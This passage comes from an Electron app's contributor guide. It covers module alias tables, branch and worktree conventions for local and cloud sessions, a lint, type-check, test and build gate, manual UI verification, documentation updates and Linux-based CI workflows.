- The three alias tables — `tsconfig.json` paths, `vitest.config.ts`, and `scripts/build-main.mjs` — must agree. `@shell/backend` in particular resolves to the **stub** under test and to Electron at build time; a mismatch means tests silently exercise the wrong module.
- Don't install or configure Xcode, or run `xcode-select --install`, from this project.

## Electron API reference

Use the official Electron docs for exact signatures (<https://www.electronjs.org/docs/latest/api/app>). The local `node_modules/electron/electron.d.ts` is the authoritative version-matched source.

## Making a change

Feature work happens on a branch and lands through a pull request. `main` is the integration branch.

```bash
git switch -c feat/step-reordering
```

Branch names: `feat/…`, `fix/…`, `chore/…`, `docs/…`.

### Where work happens

Three kinds of tree touch this repo, and the 2026-08-18 collision (see
DECISIONS) came from mixing them: uncommitted copies of already-merged work
parked in the root checkout left `main` four commits behind and unable to pull
or switch branches.

- **The root checkout** — the clone GitHub Desktop pulls `origin/main` into —
  stays on `main` with a clean working tree, so that pull is always a
  fast-forward. It is where merged work arrives, not where work happens.
- **A local session** works in its git worktree under `.claude/worktrees/`
  (`npm run bootstrap` first — see the gotchas), on a branch cut from a fresh
  `origin/main`: `git fetch origin` before branching, because the local `main`
  ref may be days old. Worktrees share the repo's `.git`, so a branch
  COMMITTED in one is immediately visible to GitHub Desktop and to every other
  local tree — there is never a reason to copy files between trees.
- **A cloud session** works in its own clone; its work reaches the repo only
  as a pushed branch and a PR. No local tree should hold uncommitted copies of
  work a cloud session is landing.

Whichever tree it is: work leaves a session as a committed branch — pushed and
PR'd when the maintainer says to — or it does not leave. A session explicitly
pointed at the root checkout still branches first, commits only its own
changes, and returns the checkout to `main`, or says exactly why it could not.

**1. Write the change, and tests with it.** A suite nobody extends decays into one nobody trusts, and most bugs found in this codebase so far were silent — wrong behaviour that threw no error and looked fine on screen. See the Testing section for the conventions that matter, especially *verify a test can fail*.

**2. Run the full gate.** Nothing runs it for you; CI cannot (see below).

```bash
npm run lint && npm run type-check && npm run test:all && npm run build
```

**3. Run the app and look at it.** `npm run dev` (hot-reloading renderer) or `npm run package` for the real bundle. After any UI-affecting change, confirm it on screen before calling it done — this is the step most easily skipped and the one that catches what tests cannot. A renderer that throws during mount shows a blank window and a *clean* main log, so also check the log: renderer errors and warnings are forwarded there by `forwardRendererConsole`.

**4. Update the docs in the same commit.** If the change adds a service, moves a boundary, or invalidates something in `docs/ARCHITECTURE.md`, fix that entry. If it involved a real decision — a trade-off, a rejected alternative, a non-obvious constraint — add an entry to `docs/DECISIONS.md`. These were kept current automatically until 2026-08-06; they now stay accurate only if changes carry them.

**5. Open a pull request.** `.github/pull_request_template.md` carries the checklist, including the two security boundaries below.

### CI

`.github/workflows/repo-hygiene.yml` runs on every push and pull request and checks repo hygiene — no generated files committed, no absolute paths, no secrets, lockfile in sync.

**The rest of the gate now runs in CI too, and could not before.** Removing the SDK removed the reason: `@glaze/core` used to resolve to a Glaze.app install outside the repo, which no hosted runner has. Every dependency now comes from `npm install`, so `.github/workflows/gate.yml` runs `lint`, `type-check`, `test:all` and `build` on a stock `ubuntu-latest` runner, plus the Playwright e2e run (under `xvfb`), the browser-preview build, and an `electron-builder` package. **Every job runs on Linux** — macOS minutes cost roughly ten times as much — so CI packages `--linux dir` where `npm run package` builds the `.app`. What CI therefore does *not* prove is that the app packages as a mac app, or that `npm run build` works on macOS; both are on you locally.

Step 2 is still worth running locally — it is the fast feedback loop, and CI cannot tell you a UI change looks wrong. But a green gate.yml is now real evidence about this repo's own code, which a green checkmark here never used to be.
